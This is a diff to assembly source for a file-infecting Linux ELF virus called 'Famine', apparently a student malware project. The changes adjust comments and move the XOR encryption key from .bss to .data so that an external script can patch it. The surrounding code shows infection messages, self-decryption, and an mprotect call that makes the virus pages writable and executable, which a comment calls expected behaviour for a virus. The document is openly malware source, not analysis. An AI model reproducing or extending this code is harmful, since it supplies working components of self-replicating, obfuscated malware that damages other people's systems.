@@ -28,7 +28,9 @@ section .data
     msg_infected:         db "infected ", 0
     msg_already_infected: db "already infected", 10, 0
     proc_self_exe:        db "/proc/self/exe", 0
-    encryption_key_storage: times KEY_SIZE db 0  ; storage for encryption key (original Famine only)
+    ; Encryption key storage for original Famine binary
+    ; Must be in .data (not .bss) so it exists in the binary file and can be modified by encrypt_binary.py
+    encryption_key_storage: times KEY_SIZE db 0
 
 section .text
 global _start
@@ -71,16 +73,18 @@ _start:
     jz .skip_decrypt            ; if 0, not encrypted (original Famine)
     
     ; Need to make code segment writable before decryption
+    ; Security note: This makes the page RWX which is a security risk,
+    ; but necessary for self-modifying code. For a virus, this is expected behavior.
     ; mprotect(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC)
-    ; First, align encrypt_start to page boundary (4KB = 0x1000)
+    ; First, align encrypt_start to page boundary (4KB = 0x1000 on x86-64 Linux)
     lea rax, [r15 + encrypt_start - virus_start]
-    and rax, ~0xfff             ; Round down to page boundary
+    and rax, ~0xfff             ; Round down to 4KB page boundary
     mov rdi, rax                ; addr = page-aligned encrypt_start
     
     ; Calculate length: from aligned address to end of virus_end (rounded up)
     lea rax, [r15 + virus_end - virus_start]
     add rax, 0xfff              ; Round up
-    and rax, ~0xfff             ; to page boundary
+    and rax, ~0xfff             ; to 4KB page boundary
     sub rax, rdi                ; len = aligned_end - aligned_start
     mov rsi, rax                ; len
     
@@ -179,7 +183,7 @@ _start:
 ; decrypt_file - Decrypt virus code using XOR with key
 ; r15 = virus base address (already set by caller)
 ; This function decrypts the virus code from encrypt_start to virus_end
-; For original Famine binary: uses key from encryption_key_storage in .bss
+; For original Famine binary: uses key from encryption_key_storage in .data
 ; For infected binaries: uses key stored at virus_end
 ; MUST NOT BE ENCRYPTED - placed before encrypt_start
 ; ============================================
@@ -199,7 +203,7 @@ decrypt_file:
     test r8, r8
     jnz .use_virus_key
     
-    ; Original Famine: use encryption_key_storage from .bss
+    ; Original Famine: use encryption_key_storage from .data
     lea rdi, [rel encryption_key_storage]
     jmp .do_decrypt
     
